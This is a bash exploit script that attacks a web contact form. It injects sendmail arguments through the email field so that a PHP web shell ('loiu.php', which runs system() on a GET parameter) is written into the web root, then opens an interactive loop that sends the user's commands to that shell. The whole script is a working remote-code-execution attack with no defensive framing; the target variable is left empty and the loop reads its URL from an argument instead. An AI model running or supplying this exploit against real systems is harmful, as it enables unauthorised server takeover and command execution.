#!/bin/bash

# Check if the target URL is provided
target=""
php_file="loiu.php"


curl "${target}" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw "email=%22attacker%40127.0.0.1%5C%22+-oQ%2Ftmp%2F+-X%2Fvar%2Fwww%2F${php_file}++root%22%40127.0.0.1&subject=blabla&text=%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E" \
  --insecure &>/dev/null
echo "Exploited."

while read -p "Enter command to execute: " cmd; do
    encoded_cmd=$(printf '%s' "$cmd" | jq -sRr @uri)
    curl -s -L "$1/${php_file}?cmd=${encoded_cmd}" 2>/dev/null
done
